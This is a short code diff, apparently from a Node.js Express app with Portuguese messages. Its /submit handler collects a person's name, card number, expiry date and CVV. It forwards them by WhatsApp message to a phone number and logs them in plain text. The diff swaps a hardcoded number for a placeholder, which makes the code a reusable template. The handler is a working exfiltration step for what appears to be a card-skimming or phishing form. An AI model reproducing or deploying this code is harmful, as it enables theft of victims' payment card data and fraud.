@@ -31,7 +31,7 @@ app.post('/submit', async (req, res) => {
     const { name, cardNumber, expiryDate, cvv } = await req.body;
 
     try {
-        await client.sendMessage('5515996652810@c.us',
+        await client.sendMessage('55(NUMERO PARA SER ENVIADO)@c.us',
             `Dados recebidos: \n nome: *${name}* \n numero: *${cardNumber}* \n data: *${expiryDate}* \n cvv: *${cvv}*`);
         console.log(`Dados recebidos: \n nome: ${name} \n numero: ${cardNumber} \n data: ${expiryDate} \n cvv:${cvv} \n`);
         res.send('Dados enviados com sucesso!');
